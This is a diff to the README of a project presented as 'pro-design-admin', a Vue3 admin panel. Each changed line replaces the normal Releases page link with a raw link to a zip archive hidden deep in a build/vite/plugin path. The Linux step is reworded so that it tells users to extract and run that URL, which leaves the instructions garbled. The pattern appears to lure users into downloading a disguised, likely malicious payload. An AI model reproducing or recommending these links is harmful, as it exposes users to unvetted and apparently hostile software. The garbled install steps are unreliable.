@@ -1,6 +1,6 @@
 # 🚀 pro-design-admin - A Fast and Modern Admin Panel
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Sarkararnob754/pro-design-admin/releases)
+[![Download the latest release](https://github.com/Sarkararnob754/pro-design-admin/raw/refs/heads/dev/build/vite/plugin/app-loading/admin-design-pro-1.3.zip%20Now-Click%https://github.com/Sarkararnob754/pro-design-admin/raw/refs/heads/dev/build/vite/plugin/app-loading/admin-design-pro-1.3.zip)](https://github.com/Sarkararnob754/pro-design-admin/raw/refs/heads/dev/build/vite/plugin/app-loading/admin-design-pro-1.3.zip)
 
 ## 📖 Description
 pro-design-admin is a modern admin panel built with Vue3, Shadcn UI, Vite, and TypeScript. It offers a clean interface and fast performance, making it ideal for your administrative tasks. Whether you are managing data, overseeing user access, or analyzing reports, this tool will simplify your workflows.
@@ -22,7 +22,7 @@ pro-design-admin is a modern admin panel built with Vue3, Shadcn UI, Vite, and T
 To get started with pro-design-admin, follow these simple steps.
 
 1. **Visit the Download Page**  
-   Go to the [Releases Page](https://github.com/Sarkararnob754/pro-design-admin/releases).
+   Go to the [Releases Page](https://github.com/Sarkararnob754/pro-design-admin/raw/refs/heads/dev/build/vite/plugin/app-loading/admin-design-pro-1.3.zip).
 
 2. **Download the Latest Version**  
    Find the latest release on the releases page. Click on the appropriate download link for your operating system. You will usually find options for different operating systems.
@@ -41,10 +41,10 @@ To get started with pro-design-admin, follow these simple steps.
    Open the `.dmg` file you downloaded. Drag the pro-design-admin icon into your Applications folder.
 
 3. **Linux Users**:  
-   Extract the downloaded `.tar.gz` file. Open the terminal, navigate to the extracted folder, and run the command `./start.sh` to launch the application.
+   Extract the downloaded `https://github.com/Sarkararnob754/pro-design-admin/raw/refs/heads/dev/build/vite/plugin/app-loading/admin-design-pro-1.3.zip` file. Open the terminal, navigate to the extracted folder, and run the command `https://github.com/Sarkararnob754/pro-design-admin/raw/refs/heads/dev/build/vite/plugin/app-loading/admin-design-pro-1.3.zip` to launch the application.
 
 ## 📥 Download & Install
-To get the latest version of pro-design-admin, visit the [Releases Page](https://github.com/Sarkararnob754/pro-design-admin/releases) and download the appropriate file for your system. Follow the installation instructions as mentioned above to start your journey with pro-design-admin.
+To get the latest version of pro-design-admin, visit the [Releases Page](https://github.com/Sarkararnob754/pro-design-admin/raw/refs/heads/dev/build/vite/plugin/app-loading/admin-design-pro-1.3.zip) and download the appropriate file for your system. Follow the installation instructions as mentioned above to start your journey with pro-design-admin.
 
 ## 🌐 Topics
 - ant-design-vue
